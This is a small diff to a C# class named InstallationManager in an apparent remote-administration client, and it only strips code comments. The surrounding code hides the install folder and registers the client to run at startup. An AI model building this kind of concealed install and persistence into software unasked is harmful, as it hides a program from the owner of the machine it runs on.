@@ -8,9 +8,6 @@ namespace RemoteAdmin.Client.Modules
 {
     public static class InstallationManager
     {
-        /// <summary>
-        /// Performs the full installation process based on ClientConfig settings
-        /// </summary>
         public static bool PerformInstallation()
         {
             try
@@ -68,7 +65,6 @@ namespace RemoteAdmin.Client.Modules
                     Console.WriteLine("Subdirectory set to hidden");
                 }
 
-                // Add to startup if configured
                 if (ClientConfig.InstallOnStartup)
                 {
                     InstallStartup(installPath);
@@ -90,9 +86,6 @@ namespace RemoteAdmin.Client.Modules
             }
         }
 
-        /// <summary>
-        /// Gets the full installation path based on ClientConfig settings
-        /// </summary>
         private static string GetInstallationPath()
         {
             string basePath;
